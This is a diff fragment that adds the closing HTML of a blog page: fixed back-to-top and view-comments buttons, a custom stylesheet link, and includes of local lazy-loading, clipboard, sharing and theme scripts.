+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/blog/css/custom.css"><script src="/blog/lib/lazysizes/lazysizes.min.js"></script><script src="/blog/lib/clipboard/clipboard.min.js"></script><script src="/blog/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/blog/js/theme.min.js"></script></body>
+</html>
